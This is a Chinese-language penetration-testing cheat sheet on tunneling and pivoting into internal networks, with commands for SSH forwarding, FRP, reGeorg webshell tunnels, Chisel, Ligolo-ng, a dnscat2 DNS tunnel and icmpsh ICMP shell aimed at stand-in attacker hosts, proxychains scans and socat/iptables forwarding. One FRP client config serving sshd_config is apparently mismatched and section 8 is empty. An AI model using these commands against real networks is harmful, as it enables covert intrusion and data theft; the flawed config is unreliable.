# 隧道代理补充

## 1. SSH隧道

### 本地端口转发

```bash
# 访问内网服务
ssh -L 8080:target:80 user@jump_host

# 访问内网RDP
ssh -L 3389:target:3389 user@jump_host
```

### 远程端口转发

```bash
# 将内网服务暴露到VPS
ssh -R 8080:localhost:80 user@vps
```

### 动态SOCKS代理

```bash
# 创建SOCKS代理
ssh -D 1080 user@jump_host

# proxychains使用
proxychains curl http://internal_ip
```

---

## 2. FRP (Fast Reverse Proxy)

### 服务端

```ini
[common]
bind_port = 7000

[http_proxy]
type = tcp
listen_port = 8080
```

### 客户端

```ini
[common]
server_addr = vps_ip
server_port = 7000

[ssh_proxy]
type = tcp
remote_port = 60022
plugin = static_file
plugin_local_path = /etc/ssh/sshd_config
```

---

## 3. reGeorg

### 脚本

```bash
# ASPX
python reGeorg.py -u http://target/tunnel.aspx

# JSP
python reGeorg.py -u http://target/tunnel.jsp

# PHP
python reGeorg.py -u http://target/tunnel.php
```

---

## 4. Chisel

### 服务端

```bash
chisel server -p 8080 --reverse
```

### 客户端

```bash
chisel client vps:8080 R:1080:socks
chisel client vps:8080 R:2222:127.0.0.1:22
```

---

## 5. Ligolo-ng

### 服务端

```bash
./ligolo-ng_proxy -selfcert -laddr 0.0.0.0:11601
```

### 客户端

```bash
./ligolo-ng_agent -connect vps:11601 -attempts 10 -delay 15 -selfcert
```

---

## 6. DNS隧道

### dnscat2

```bash
# 服务端
./dnscat2-server --secret=secret

# 客户端
./dnscat2 --secret=secret attacker.com
```

---

## 7. ICMP隧道

### icmpsh

```bash
# 攻击者
./icmpsh_m.py attacker_ip target_ip

# 目标
./icmpsh -t attacker_ip -s 128
```

---

## 8. HTTP隧道

### reGeorg变体

```
Tunneling
```

---

## 9. 代理链

### ProxyChains

```bash
proxychains nmap -sT internal_ip
proxychains curl http://internal_ip
```

---

## 10. 端口转发

### socat

```bash
socat TCP-LISTEN:8080,fork TCP:target:80
```

### iptables

```bash
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination target:80
```
